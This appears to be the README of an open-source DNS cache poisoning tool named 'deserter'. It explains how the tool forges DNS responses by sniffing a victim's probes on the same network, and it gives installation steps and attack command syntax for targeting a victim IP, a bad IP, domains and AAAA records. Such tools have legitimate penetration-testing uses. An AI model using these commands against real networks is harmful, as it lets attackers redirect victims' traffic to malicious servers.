<!-- ABOUT THE PROJECT -->
## About The Project

<!---[![Product Name Screen Shot][product-screenshot]](https://example.com)-->

`deserter` is a *targeted* DNS cache poisoner. It is capable of DNS cache poisoning *without* bruteforcing the target ID and source port - instead, it sniffs out DNS probes and uses the information inside to craft poisoned responses and send them back to the target.

<!-- GETTING STARTED -->
## Getting Started

To get a local copy up and running follow these simple steps.

### Prerequisites

In order for the tool to work, the attacker needs to be on the same network as the victim. Sometimes, *arp spoofing* may also be required - usually on physical connections through Ethernet.

### Installation

1. Clone the repo with its submodule 
```bash
git clone --recurse-submodules https://github.com/b4ckslash0/deserter
```

2. Change into `deserter/scripts`
```bash
cd deserter/scripts
```

3. Change the permissions for the installation script and run it
```bash
chmod +x install.sh
```
```bash
./install.sh
```

### Installation with support for multiple queries in a single request
1. Clone the repo with its submodule 
```bash
git clone --recurse-submodules https://github.com/b4ckslash0/deserter
```

2. Change into `deserter/scripts`
```bash
cd deserter/scripts
```

3. Change the permissions for the installation script and run it with the `SUPPORT_MULTIPLE_QUERIES_IN_A_SINGLE_REQUEST` option
```bash
chmod +x install.sh
```
```bash
./install.sh SUPPORT_MULTIPLE_QUERIES_IN_A_SINGLE_REQUEST
```

<!-- USAGE EXAMPLES -->
## Usage

The tool requires sudo permissions to be run.
You can run deserter with `--help` to get information about all of the available options. Three of them are required:
- `-t` - the IPv4 address of the victim
- `-b` - the IPv4 address to poison resource records with
- `-i` - the interface to use (IP address or a name)

### Performing a DNS cache poisoning
The following syntax can be used for a simple DNS cache poisoning attack:
```bash
./deserter -t <victim IP> -b <bad IP> -i <interface>
```
or
```bash
./deserter --target <victim IP> --bad_ip <bad IP> --interface <interface>
```

We are successful:

### Specifying domains to poison
It is also possible to specify which domains you want deserter to poison by using the --domains or -d options and then specifying a list of domains separated by commas without spaces:
```bash
./deserter -t <victim IP> -b <bad IP> -i <interface> -d domain1,domain2,domain3,...
```

### Poisoning AAAA records
deserter is capable of poisoning AAAA records, as well. You will need to specify the `--bad-ipv6` option followed by the IPv6 address you want to poison the cache with:

### Continuous packet capture
By default, deserter ends its execution after poisoning a single probe. You can tell it to continue waiting for packets and poisoning them by specifying the `--keep-alive` command-line argument:

<!-- ROADMAP -->
## Roadmap
- Support for DNS over IPv6
- See the [open issues](https://github.com/b4ckslash0/deserter/issues) for a list of proposed features (and known issues).
